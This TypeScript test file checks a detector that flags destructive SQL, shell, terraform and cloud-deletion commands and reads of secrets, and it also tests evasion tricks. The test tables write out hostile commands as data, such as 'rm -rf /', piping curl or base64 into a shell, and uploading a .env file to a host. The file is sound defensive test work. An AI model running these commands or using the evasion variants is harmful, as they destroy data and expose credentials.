import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { DETECTORS, detectValue, sanitizeTarget, type DetectorName } from '../detect/index.js';

/** [input, expected kind] for a definite match. */
type Hit = [string, string];
/** [input, expected reason] for a fail-safe match (parsed: false). */
type Unsure = [string, string];

function table(name: DetectorName, cases: { hit: Hit[]; miss: string[]; unsure: Unsure[] }): void {
  const fn = DETECTORS[name];
  describe(`detector ${name}`, () => {
    for (const [text, kind] of cases.hit) {
      it(`matches ${JSON.stringify(text)} as ${kind}`, () => {
        const r = fn(text);
        assert.equal(r.matched, true, JSON.stringify(r));
        assert.equal(r.parsed, true, JSON.stringify(r));
        assert.equal(r.kind, kind);
      });
    }
    for (const text of cases.miss) {
      it(`does not match ${JSON.stringify(text)}`, () => {
        const r = fn(text);
        assert.equal(r.matched, false, JSON.stringify(r));
        assert.equal(r.parsed, true);
      });
    }
    for (const [text, reason] of cases.unsure) {
      it(`fails safe on ${JSON.stringify(text)} (${reason})`, () => {
        const r = fn(text);
        assert.equal(r.matched, true, JSON.stringify(r));
        assert.equal(r.parsed, false, JSON.stringify(r));
        assert.equal(r.reason, reason);
      });
    }
  });
}

table('sql_destructive', {
  hit: [
    ['DROP TABLE users', 'drop_table'],
    ['drop table if exists "Users"', 'drop_table'],
    ['DROP DATABASE prod', 'drop_database'],
    ['DROP SCHEMA public CASCADE', 'drop_schema'],
    ['DROP INDEX idx_users_email', 'drop_object'],
    ['TRUNCATE orders', 'truncate'],
    ['truncate table only orders restart identity', 'truncate'],
    ['DELETE FROM users', 'delete_without_where'],
    ['DELETE FROM users WHERE 1=1', 'delete_without_where'],
    ['DELETE FROM users WHERE TRUE', 'delete_without_where'],
    ["DELETE FROM users WHERE id = 5 OR 'a'='a'", 'delete_without_where'],
    ['UPDATE users SET admin = true', 'update_without_where'],
    ['UPDATE accounts SET balance = 0 RETURNING *', 'update_without_where'],
    ['ALTER TABLE users DROP COLUMN email', 'alter_drop'],
    ['ALTER TABLE users DROP CONSTRAINT users_pkey', 'alter_drop'],
    ['MERGE INTO t USING s ON t.id = s.id WHEN MATCHED THEN DELETE', 'merge_delete'],
    ["COPY t TO PROGRAM 'rm -rf /'", 'copy_program'],
    ['EXPLAIN ANALYZE DELETE FROM t', 'delete_without_where'],
    // Evasion: case, whitespace, comments, multiple statements, quoting.
    ['/* hi */ DrOp\n\t  DATABASE prod', 'drop_database'],
    ['SELECT 1; TRUNCATE orders', 'truncate'],
    ['SELECT 1 /* ; */ ; DROP TABLE x', 'drop_table'],
    ["SELECT 'it''s; fine'; DROP TABLE x", 'drop_table'],
    ['SELECT 1--1; DROP TABLE x', 'drop_table'],
    ['SELECT 1 # comment?\n; DROP TABLE x', 'drop_table'],
    ['/*!50000 DROP TABLE x */', 'drop_table'],
    ['DROP TABLE [dbo].[users]\nGO', 'drop_table'],
    ['DROP TABLE `users`', 'drop_table'],
    ['WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d', 'delete_without_where'],
    ['SELECT * FROM (DELETE FROM t RETURNING id) x', 'delete_without_where'],
    ['DO $$ BEGIN DROP TABLE x; END $$', 'drop_table'],
    ['DO $body$ BEGIN IF true THEN TRUNCATE t; END IF; END $body$', 'truncate'],
    ["PREPARE s FROM 'DROP TABLE x'", 'drop_table'],
    ['PREPARE s AS DELETE FROM t', 'delete_without_where'],
    ["EXEC('DROP TABLE x')", 'drop_table'],
    ["EXEC sp_executesql N'DROP TABLE x'", 'drop_table'],
    ['CREATE FUNCTION f() RETURNS void AS $$ DROP TABLE x $$ LANGUAGE sql', 'drop_table'],
    ['CREATE RULE r AS ON INSERT TO t DO INSTEAD DELETE FROM t', 'delete_without_where'],
  ],
  miss: [
    'SELECT * FROM users',
    'DELETE FROM users WHERE id = 1',
    'UPDATE users SET admin = true WHERE id = 3',
    "UPDATE users SET name = 'DROP TABLE x' WHERE id = 3",
    'ALTER TABLE users ALTER COLUMN email DROP NOT NULL',
    'ALTER TABLE users ALTER COLUMN email DROP DEFAULT',
    'ALTER TABLE users ADD COLUMN age int',
    'SELECT * FROM users -- DROP TABLE x',
    'SELECT 1 /* DROP TABLE x */',
    'INSERT INTO t VALUES (1) ON CONFLICT (id) DO UPDATE SET v = 2',
    'INSERT INTO t VALUES (1) ON DUPLICATE KEY UPDATE v = 2',
    'CREATE TABLE t (id int REFERENCES u ON DELETE CASCADE)',
    'GRANT DELETE ON t TO app',
    'SELECT * FROM users WHERE deleted_at IS NULL',
    'CREATE INDEX CONCURRENTLY idx ON t (a)',
    'CREATE TRIGGER t AFTER INSERT ON x FOR EACH ROW EXECUTE FUNCTION f()',
    "SELECT 'DELETE FROM users'",
    '',
  ],
  unsure: [
    ["SELECT 'unterminated", 'unbalanced_quote'],
    ['SELECT 1 /* never closed', 'unterminated_comment'],
    ["EXECUTE 'DROP TABLE ' || tbl", 'dynamic_sql'],
    ['EXECUTE stmt', 'dynamic_sql'],
    ['PREPARE s FROM @sql', 'dynamic_sql'],
    ['DO $$ BEGIN EXECUTE format($f$DROP TABLE %I$f$, t); END $$', 'dynamic_sql'],
    ["SELECT 'a\\'; DROP TABLE x; --'", 'unbalanced_quote'],
  ],
});

table('shell_destructive', {
  hit: [
    ['rm -rf /', 'rm_recursive'],
    ['rm -fr ~/', 'rm_recursive'],
    ['rm -r -f --verbose /var/lib/postgres', 'rm_recursive'],
    ['rm --recursive --force /etc', 'rm_recursive'],
    ['rm -R /srv/data', 'rm_recursive'],
    ['rm -rf ..', 'rm_recursive'],
    ['rm -rf ../other-repo', 'rm_recursive'],
    ['rm -rf .', 'rm_recursive'],
    ['rm -rf *', 'rm_recursive'],
    ['rm -rf .*', 'rm_recursive'],
    ['rm -rf .git', 'rm_recursive'],
    ['rm -rf /tmp/*', 'rm_recursive'],
    ['rm -rf --no-preserve-root /', 'rm_recursive'],
    ['rm -rf $HOME/projects', 'rm_recursive'],
    ['rm -rf "${HOME}"', 'rm_recursive'],
    ['git push --force origin feature', 'git_force_push'],
    ['git push -f', 'git_force_push'],
    ['git push --force-with-lease origin feature', 'git_force_push'],
    ['git push origin +feature', 'git_force_push'],
    ['git push origin main', 'git_push_protected'],
    ['git push origin HEAD:refs/heads/master', 'git_push_protected'],
    ['git push --all origin', 'git_push_protected'],
    ['git push origin :main', 'git_push_delete'],
    ['git push origin --delete feature', 'git_push_delete'],
    ['git push --mirror', 'git_push_mirror'],
    ['git -C repo -c core.x=y push -f', 'git_force_push'],
    ['dd if=/dev/zero of=/dev/sda bs=1M', 'disk_write'],
    ['cat image.iso > /dev/disk2', 'disk_write'],
    ['mkfs.ext4 /dev/sdb1', 'disk_format'],
    ['wipefs -a /dev/sdb', 'disk_format'],
    ['shred -u secrets.txt', 'shred'],
    ["find / -name '*.log' -delete", 'find_delete'],
    ['find . -name "*.pyc" -delete', 'find_delete'],
    ['find /var -exec rm -rf {} +', 'find_delete'],
    ['chmod -R 777 /', 'recursive_permissions'],
    ['chown -R me:me ~/', 'recursive_permissions'],
    ['chmod -R 755 /usr/local', 'recursive_permissions'],
    ['psql -c "DROP TABLE users"', 'drop_table'],
    ['psql --command="TRUNCATE t" app', 'truncate'],
    ['mysql -e "DELETE FROM users"', 'delete_without_where'],
    ['sqlite3 app.db "DROP TABLE t"', 'drop_table'],
    ['psql <<< "DROP TABLE t"', 'drop_table'],
    ['psql app <<SQL\nDROP TABLE users;\nSQL\n', 'drop_table'],
    // Evasion: flag order, quoting, case, chains, wrappers, subshells, substitutions.
    ['rm -rf -- /', 'rm_recursive'],
    ['rm / -rf', 'rm_recursive'],
    ['rm "-rf" /', 'rm_recursive'],
    ["r''m -rf /", 'rm_recursive'],
    ['\\rm -rf /', 'rm_recursive'],
    ['/bin/rm -rf /', 'rm_recursive'],
    ['RM -RF /', 'rm_recursive'],
    ['npm test && rm -rf ~', 'rm_recursive'],
    ['ls; rm -rf /etc', 'rm_recursive'],
    ['echo hi | rm -rf /', 'rm_recursive'],
    ['true || rm -rf /', 'rm_recursive'],
    ['(rm -rf /)', 'rm_recursive'],
    ['{ rm -rf /; }', 'rm_recursive'],
    ['if true; then rm -rf /; fi', 'rm_recursive'],
    ['cd / && rm -rf usr', 'rm_recursive'],
    ['cd .. && rm -rf *', 'rm_recursive'],
    ['sudo rm -rf /etc', 'rm_recursive'],
    ['sudo -u root -E rm -rf /etc', 'rm_recursive'],
    ['nohup sudo timeout 10 nice -n 5 rm -rf /opt', 'rm_recursive'],
    ['env -i PATH=/bin rm -rf /usr', 'rm_recursive'],
    ['FOO=1 rm -rf /usr', 'rm_recursive'],
    ['bash -c "rm -rf /"', 'rm_recursive'],
    ["sh -c 'echo hi; rm -rf $HOME'", 'rm_recursive'],
    ["bash -lc 'rm -rf ~'", 'rm_recursive'],
    ["bash -c \"sh -c 'rm -rf /'\"", 'rm_recursive'],
    ["su -c 'rm -rf /' root", 'rm_recursive'],
    ["ssh prod 'rm -rf /var/www'", 'rm_recursive'],
    ['watch -n 5 rm -rf /data', 'rm_recursive'],
    ["alias ll='rm -rf /'; ll", 'rm_recursive'],
    ['echo $(rm -rf /)', 'rm_recursive'],
    ['echo `rm -rf /`', 'rm_recursive'],
    ['diff <(rm -rf /) b', 'rm_recursive'],
    ['f() { rm -rf /; }; f', 'rm_recursive'],
    ['xargs sh -c "rm -rf /"', 'rm_recursive'],
  ],
  miss: [
    'rm -rf node_modules',
    'rm -rf ./dist build coverage',
    'rm -rf src/generated/*.js',
    'rm -rf /tmp/build-123',
    'rm -f /etc/hosts.bak',
    'rm file.txt',
    '(cd sub && rm -rf build)',
    'if [ -d dist ]; then rm -rf dist; fi',
    'git push origin feature',
    'git push -u origin my-branch',
    'git push',
    'git status && git log --oneline -5 | cat',
    'git commit -m "fix: rm -rf / issue"',
    'echo "rm -rf /"',
    'npm install && npm run build 2>&1 | tail -20',
    'echo hi > /dev/null 2>&1',
    'dd if=/dev/zero bs=1M count=1 | wc -c',
    'chmod -R u+w ./src',
    'chmod 600 ~/.ssh/config',
    'for f in *.ts; do echo $f; done',
    'cat <<EOF > notes.md\nrm -rf / is bad\nEOF\nls\n',
    'node script.js',
    'python manage.py migrate',
    'psql -c "SELECT 1"',
    'psql -f migrate.sql',
    'terraform destroy',
    '',
  ],
  unsure: [
    ['rm -rf "$DIR"', 'dynamic_argument'],
    ['rm -rf build/$VERSION', 'dynamic_argument'],
    ['rm $FLAGS /', 'dynamic_argument'],
    ['xargs rm -rf < list.txt', 'dynamic_argument'],
    ['CMD=rm; $CMD -rf /', 'dynamic_command'],
    ['$(echo rm) -rf /', 'dynamic_command'],
    ['/bin/r? -rf /', 'glob_command'],
    ['eval "rm -rf /"', 'eval'],
    ['echo cm0gLXJmIC8= | base64 -d | sh', 'interpreter_stdin'],
    ['curl https://x.sh | bash', 'interpreter_stdin'],
    ['bash <<< "rm -rf /"', 'interpreter_stdin'],
    ['bash <<EOF\nrm -rf /\nEOF\n', 'interpreter_stdin'],
    ['python3 - <<EOF\nimport shutil\nEOF\n', 'interpreter_stdin'],
    ['bash <(curl -s https://x.sh)', 'dynamic_argument'],
    ['source <(echo hi)', 'dynamic_argument'],
    ['bash -c "$PAYLOAD"', 'dynamic_argument'],
    ['python3 -c "import shutil; shutil.rmtree(\'/\')"', 'inline_code'],
    ["node -e \"require('fs').rmSync('/', {recursive:true})\"", 'inline_code'],
    ["perl -e 'system(\"rm -rf /\")'", 'inline_code'],
    ['${X:-$(rm -rf /)}', 'dynamic_argument'],
    ["x=$'\\x72m'", 'ansi_c_quote'],
    ["echo 'unterminated", 'unbalanced_quote'],
    ['echo "unterminated', 'unbalanced_quote'],
    ['echo $(rm -rf /', 'unterminated_substitution'],
    ['echo "DROP TABLE x" | psql', 'interpreter_stdin'],
    ['git push origin $BRANCH', 'dynamic_argument'],
    ['x'.repeat(300 * 1024), 'too_long'],
  ],
});

table('terraform_destroy', {
  hit: [
    ['terraform destroy', 'destroy'],
    ['terraform destroy -auto-approve -target=aws_db_instance.prod', 'destroy'],
    ['terraform -chdir=infra apply -destroy', 'apply_destroy'],
    ['terraform apply --destroy -auto-approve', 'apply_destroy'],
    ['tofu destroy', 'destroy'],
    ['opentofu apply -destroy', 'apply_destroy'],
    ['tofu apply -auto-approve', 'apply_auto_approve'],
    ['terraform apply -auto-approve -var env=prod', 'apply_auto_approve'],
    ['terraform plan -destroy -out p && terraform apply p', 'apply_destroy'],
    ['TF_CLI_ARGS_apply="-destroy" terraform apply', 'apply_destroy'],
    ['terragrunt run-all destroy', 'destroy'],
    ['cd infra && sudo terraform destroy', 'destroy'],
    ["bash -c 'terraform destroy'", 'destroy'],
  ],
  miss: [
    'terraform plan',
    'terraform plan -destroy',
    'terraform apply tfplan',
    'terraform apply',
    'terraform init && terraform validate',
    'terraform apply -auto-approve=false',
    'echo terraform destroy',
    'cd infra && terraform init && terraform plan -out tfplan',
  ],
  unsure: [
    ['terraform $SUB', 'dynamic_argument'],
    ['eval "terraform destroy"', 'eval'],
    ['TF_CLI_ARGS="$X" terraform apply plan', 'dynamic_argument'],
  ],
});

table('cloud_delete', {
  hit: [
    ['aws rds delete-db-instance --db-instance-identifier prod-db --skip-final-snapshot', 'database_delete'],
    ['aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier s', 'snapshot_delete'],
    ['aws --region us-east-1 ec2 delete-volume --volume-id vol-123', 'volume_delete'],
    ['aws ec2 delete-snapshot --snapshot-id snap-1', 'snapshot_delete'],
    ['aws s3 rb s3://my-bucket --force', 'bucket_delete'],
    ['aws s3 rm s3://b/ --recursive', 'bucket_delete'],
    ['aws dynamodb delete-table --table-name t', 'database_delete'],
    ['aws backup delete-recovery-point --backup-vault-name v --recovery-point-arn a', 'backup_delete'],
    ['aws ec2 terminate-instances --instance-ids i-1', 'instance_delete'],
    ['gcloud sql instances delete prod --quiet', 'database_delete'],
    ['gcloud compute disks delete d1 --zone us-central1-a', 'volume_delete'],
    ['gcloud compute snapshots delete s1', 'snapshot_delete'],
    ['gcloud sql backups delete 123 --instance prod', 'backup_delete'],
    ['gcloud projects delete my-proj', 'project_delete'],
    ['gcloud storage rm -r gs://bucket', 'bucket_delete'],
    ['gcloud --project p beta spanner databases delete db --instance i', 'database_delete'],
    ['gsutil -m rm -r gs://bucket', 'bucket_delete'],
    ['gsutil rb gs://bucket', 'bucket_delete'],
    ['bq rm -r -f dataset', 'database_delete'],
    ['az group delete -n rg --yes', 'resource_group_delete'],
    ['az sql db delete -g rg -s srv -n db', 'database_delete'],
    ['az disk delete -g rg -n d', 'volume_delete'],
    ['az storage account delete -n acct', 'bucket_delete'],
    ['doctl databases delete abc', 'database_delete'],
    ['doctl compute volume delete v', 'volume_delete'],
    ['doctl compute snapshot rm s', 'snapshot_delete'],
    ['fly volumes destroy vol_1', 'volume_delete'],
    ['flyctl postgres destroy mydb', 'database_delete'],
    ['flyctl apps destroy myapp', 'resource_delete'],
    ['railway delete', 'project_delete'],
    ['railway volume delete', 'volume_delete'],
    ['supabase projects delete ref', 'project_delete'],
    ['supabase db reset --linked', 'database_delete'],
    ['kubectl delete ns prod', 'namespace_delete'],
    ['kubectl delete namespace prod', 'namespace_delete'],
    ['kubectl -n prod delete pvc data-0', 'volume_delete'],
    ['kubectl delete pv/my-pv', 'volume_delete'],
    ['kubectl delete pvc,pv --selector app=db', 'volume_delete'],
    ['kubectl delete pods --all', 'k8s_delete_all'],
    ['kubectl delete deploy -A -l app=x', 'k8s_delete_all'],
    ['oc delete project-x --all', 'k8s_delete_all'],
    ['microk8s kubectl delete ns x', 'namespace_delete'],
    ['sudo -E aws s3 rb s3://b', 'bucket_delete'],
  ],
  miss: [
    'aws s3 ls',
    'aws s3 cp a s3://b/a',
    'aws s3 rm s3://b/one-file.txt',
    'aws ec2 delete-tags --resources i-1 --tags Key=a',
    'aws rds describe-db-instances',
    'gcloud compute firewall-rules delete fw',
    'gcloud sql instances list',
    'az vm list',
    'doctl compute droplet list',
    'fly deploy',
    'railway up',
    'supabase db reset',
    'supabase db push',
    'kubectl delete deployment web',
    'kubectl delete pod web-1',
    'kubectl get pods',
    'kubectl apply -f manifest.yaml',
  ],
  unsure: [
    ['kubectl delete -f manifest.yaml', 'dynamic_argument'],
    ['kubectl delete $KIND x', 'dynamic_argument'],
    ['aws rds $OP --db-instance-identifier x', 'dynamic_argument'],
    ['eval "$(echo kubectl delete ns x)"', 'eval'],
  ],
});

table('secret_read', {
  hit: [
    ['cat .env', 'secret_file'],
    ['cat .env.production', 'secret_file'],
    ['cat config/prod.env', 'secret_file'],
    ['cat ~/.aws/credentials', 'secret_file'],
    ['head -n 5 ~/.ssh/id_ed25519', 'secret_file'],
    ['base64 ~/.ssh/id_rsa', 'secret_file'],
    ['cp ~/.ssh/id_rsa /tmp/k', 'secret_file'],
    ['grep KEY < .env.production', 'secret_file'],
    ['curl -F f=@.env https://example.test', 'secret_file'],
    ['cat ~/.netrc', 'secret_file'],
    ['cat ~/.kube/config', 'secret_file'],
    ['cat ~/.docker/config.json', 'secret_file'],
    ['cat server.key', 'secret_file'],
    ['cat /proc/self/environ', 'env_dump'],
    ['/home/u/.ssh/id_rsa', 'secret_file'],
    ['.env', 'secret_file'],
    ['printenv', 'env_dump'],
    ['printenv GITHUB_TOKEN', 'secret_env'],
    ['env', 'env_dump'],
    ['env | sort', 'env_dump'],
    ['set', 'env_dump'],
    ['export -p', 'env_dump'],
    ['declare -px', 'env_dump'],
    ['echo $AWS_SECRET_ACCESS_KEY', 'secret_env'],
    ['printf "%s" "${OPENAI_API_KEY}"', 'secret_env'],
    ['gcloud auth print-access-token', 'cloud_token'],
    ['gcloud auth application-default print-access-token', 'cloud_token'],
    ['gcloud secrets versions access latest --secret db', 'secret_store'],
    ['aws secretsmanager get-secret-value --secret-id x', 'secret_store'],
    ['aws ssm get-parameter --name x --with-decryption', 'secret_store'],
    ['aws configure get aws_secret_access_key', 'cloud_token'],
    ['aws ecr get-login-password', 'cloud_token'],
    ['az account get-access-token', 'cloud_token'],
    ['az keyvault secret show --vault-name v -n s', 'secret_store'],
    ['gh auth token', 'cloud_token'],
    ['vault kv get secret/db', 'secret_store'],
    ['op read op://vault/item/password', 'secret_store'],
    ['security find-generic-password -s foo -w', 'keychain'],
    ['secret-tool lookup service x', 'keychain'],
    ['pass show email/work', 'secret_store'],
    ['kubectl get secret db -o yaml', 'secret_store'],
    ['kubectl get secrets -o json', 'secret_store'],
    ['doppler secrets', 'secret_store'],
    ['heroku config', 'secret_store'],
    ['railway variables', 'secret_store'],
    ['vercel env pull', 'secret_store'],
    ['git credential fill', 'cloud_token'],
    ['sudo cat /root/.aws/credentials', 'secret_file'],
    ["bash -c 'cat .env'", 'secret_file'],
  ],
  miss: [
    'cat .env.example',
    'cat .env.sample',
    'cat ~/.ssh/id_ed25519.pub',
    'cat ~/.ssh/known_hosts',
    'cat README.md',
    'src/index.ts',
    'printenv PATH',
    'env FOO=1 node app.js',
    'echo $PATH',
    'curl -H "Authorization: Bearer $TOKEN" https://example.test',
    'kubectl get secrets',
    'gcloud auth list',
    'gh auth status',
    'ls -la ~/.ssh',
    'pass ls',
    'source .env && npm start',
    'export NODE_ENV=production',
  ],
  unsure: [
    ['cat $FILE | $SEND', 'dynamic_command'],
    ['eval "cat .env"', 'eval'],
    ["python3 -c 'print(open(\".env\").read())'", 'inline_code'],
  ],
});

describe('detectValue', () => {
  it('ignores values that carry no text', () => {
    for (const v of [undefined, null, 1, true]) assert.equal(detectValue('shell_destructive', v), null);
  });

  it('reads a string list as an argv, quoting each element', () => {
    const r = detectValue('shell_destructive', ['bash', '-c', 'rm -rf /'])!;
    assert.equal(r.kind, 'rm_recursive');
    assert.equal(detectValue('shell_destructive', ['echo', 'a; rm -rf /'])!.matched, false);
  });

  it('reads a string list as statements for SQL', () => {
    assert.equal(detectValue('sql_destructive', ['SELECT 1', 'DROP TABLE t'])!.kind, 'drop_table');
  });

  it('fails safe on any other shape', () => {
    for (const v of [{ cmd: 'rm -rf /' }, ['rm', 1], [['rm']]]) {
      const r = detectValue('shell_destructive', v)!;
      assert.equal(r.matched, true);
      assert.equal(r.parsed, false);
      assert.equal(r.reason, 'non_text_argument');
    }
  });
});

describe('sanitizeTarget', () => {
  it('strips control and bidi characters, collapses whitespace and bounds length', () => {
    assert.equal(sanitizeTarget('a\u0007b‮c\n\nd'), 'a b c d');
    assert.equal(sanitizeTarget('build/\u0000'), 'build/…');
    const long = sanitizeTarget('x'.repeat(500))!;
    assert.equal(Array.from(long).length, 120);
    assert.ok(long.endsWith('…'));
    assert.equal(sanitizeTarget('\u0001\u0002'), undefined);
    assert.equal(sanitizeTarget(undefined), undefined);
  });
});
